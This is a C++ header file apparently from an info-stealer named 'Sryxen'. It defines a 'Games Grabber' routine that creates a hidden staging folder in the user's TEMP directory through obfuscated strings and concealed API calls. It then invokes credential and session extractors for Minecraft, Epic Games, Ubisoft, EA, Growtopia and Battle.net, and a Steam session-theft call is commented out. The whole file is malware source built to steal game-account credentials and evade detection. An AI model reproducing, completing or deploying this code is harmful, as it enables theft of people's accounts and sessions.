#ifndef ENTRYPOINT_GAMES_HPP
#define ENTRYPOINT_GAMES_HPP

#include <iostream>
#include "Minecraft.hpp"
#include "EpicGames.hpp"
#include "Ubisoft.hpp"
#include "ElectronicArts.hpp"
#include "Growtopia.hpp"
#include "BattleNet.hpp"
#include "Steam.hpp"
#include "SteamDumper.hpp"
namespace Games {
    inline void Extract() {
        DEBUG_PRINT(L"Games Grabber Started");
        std::string gamesDir = std::string(getenv("TEMP")) + OBF("\\Sryxen\\Games");

        if (!HiddenCalls::CreateDirectoryA(gamesDir.c_str(), NULL)) {
            //kjys
        }
        else {
            //kjys
        }

        Minecraft::Extract(gamesDir);
        EpicGames::Extract(gamesDir);
        Ubisoft::Extract(gamesDir);
        ElectronicArts::Extract(gamesDir);
        Growtopia::Extract(gamesDir);
        BattleNet::Extract(gamesDir);
        //Steam::ExtractSteamSession(gamesDir);
        DEBUG_PRINT(L"Games Grabber Finished");
    }
}

#endif
